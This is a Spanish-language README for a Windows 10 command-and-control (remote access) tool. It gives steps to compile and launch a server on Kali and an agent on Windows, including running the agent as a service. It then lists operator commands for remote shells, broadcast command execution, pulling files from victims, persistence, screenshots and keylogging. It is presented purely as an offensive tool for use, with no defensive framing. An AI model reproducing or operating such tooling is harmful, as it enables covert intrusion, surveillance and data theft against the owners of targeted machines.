# C2-SpiderRed-Win-10

USO:
1. En Kali:
bash

# Compilar servidor
chmod +x compile_server.sh
./compile_server.sh

# Ejecutar servidor
./c2_server

2. En Windows:
bash

# Compilar agente
compile_agent.bat

# Ejecutar agente (modo normal)
agent.exe

# Ejecutar como servicio
agent.exe --service

# Ejecutar en modo debug (muestra consola)
agent.exe --debug

COMANDOS DEL SERVER:
text

C2> agents                    # Listar agentes conectados
C2> interact 0               # Interactuar con agente 0
C2> broadcast whoami         # Ejecutar en todos los agentes
C2> shell 0                  # Obtener shell interactiva
C2> upload 0 local.txt C:\   # Subir archivo
C2> download 0 C:\file.txt   # Descargar archivo
C2> persist 0                # Establecer persistencia
C2> screenshot 0             # Capturar pantalla
C2> keylogger 0 start        # Iniciar keylogger
C2> exit                     # Salir
